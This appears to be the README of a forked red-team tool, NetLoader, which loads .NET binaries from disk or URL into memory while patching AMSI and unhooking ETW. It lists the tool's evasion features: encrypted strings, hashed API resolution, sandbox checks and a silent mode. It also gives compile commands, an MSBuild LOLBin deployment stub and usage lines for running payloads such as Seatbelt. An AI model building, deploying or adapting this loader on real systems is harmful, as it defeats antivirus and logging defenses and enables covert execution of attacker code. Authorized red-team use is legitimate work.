# NetLoader
Loads any C# binary from filepath or url, patching AMSI and unhooking ETW.

Forked from [Flangvik/NetLoader](https://github.com/Flangvik/NetLoader) with hardened evasion:
- All sensitive strings (DLL names, API names) XOR-encrypted at rest, decrypted at runtime
- Hash-based export resolution (djb2) instead of plaintext name comparison
- AMSI and ETW patch bytes encrypted — no recognizable static signatures
- Sandbox evasion via non-emulated API check (FlsAlloc) and timing verification
- Original memory protection restored after patching (no leftover RWX pages)
- Silent by default — no console output unless `-v` is passed
- Realistic browser User-Agent on HTTP downloads

**Looking for binaries/payloads to deploy? Checkout [SharpCollection](https://github.com/Flangvik/SharpCollection)**!

# Compile

### Option 1: .NET Framework csc.exe (Windows — recommended for deployment)

This produces a standalone .NET Framework 4.x executable that runs on any Windows machine without additional runtimes.

	c:\windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /t:exe /out:NetLoader.exe Source\Program.cs

For 32-bit targets:

	c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:NetLoader.exe Source\Program.cs

### Option 2: dotnet build (cross-platform)

Requires .NET 6.0+ SDK. Produces a .NET 6 assembly.

	cd Source
	dotnet build -c Release

Output: `Source/bin/Release/net6.0/NetLoader.dll`

Run with: `dotnet Source/bin/Release/net6.0/NetLoader.dll -path <binary>`

### Option 3: dotnet publish (single-file, self-contained)

Produces a single executable with the runtime embedded — no .NET install required on the target.

	cd Source
	dotnet publish -c Release -r win-x64 --self-contained true -p:PublishSingleFile=true -o ../Build

Output: `Build/NetLoader.exe`

# Deploy via LOLBin (MSBuild)

Payload for MSBuild is in the `/LOLBins` folder. Arguments must be edited in the XML file before deployment.

	Adding arguments to the XML payload:
	    public class ClassExample : Task, ITask
	    {
	        public override bool Execute()
	        {
	            Conductor.Main(new string[] { "--path", "\\smbshare\Seatbelt.exe" });
	            return true;
	        }
	    }

	For 64 bit:
	C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe NetLoader.xml

	For 32 bit:
	C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe NetLoader.xml

# Usage

Deploy payload from local path or SMB share:

	.\NetLoader.exe -path Seatbelt.exe -args whoami

With verbose output:

	.\NetLoader.exe -v -path Seatbelt.exe -args whoami

With base64-encoded arguments:

	.\NetLoader.exe -b64 -path U2VhdGJlbHQuZXhl -args d2hvYW1p

With XOR-encrypted binary:

	.\NetLoader.exe -xor MySecretKey -path EncryptedPayload.bin -args whoami

Full flags:

	Usage: [-b64] [-xor <key>] -path <binary_path> [-args <binary_args>] [-v]
	    -b64   Base64 decode all subsequent parameters
	    -xor   XOR decrypt the binary with the given key
	    -path  Path or URL of the .NET binary to load
	    -args  Arguments to pass to the loaded binary
	    -v     Verbose output

# Tools

`Tools/encrypt_string.py` generates XOR-encrypted byte arrays for C# string constants. Use this to regenerate the encrypted strings if you change target API names or the XOR key.

	python3 Tools/encrypt_string.py "AmsiScanBuffer" 0x4B _s7

# Credits
[Flangvik](https://github.com/Flangvik) for the original NetLoader
[Arno0x](https://twitter.com/Arno0x0x) for the partial rewrite [see gist](https://gist.github.com/Arno0x/2b223114a726be3c5e7a9cacd25053a2)
[_RastaMouse](https://twitter.com/_RastaMouse/) for the [AMSI bypass](https://github.com/rasta-mouse/AmsiScanBufferBypass/blob/master/ASBBypass/Program.cs)
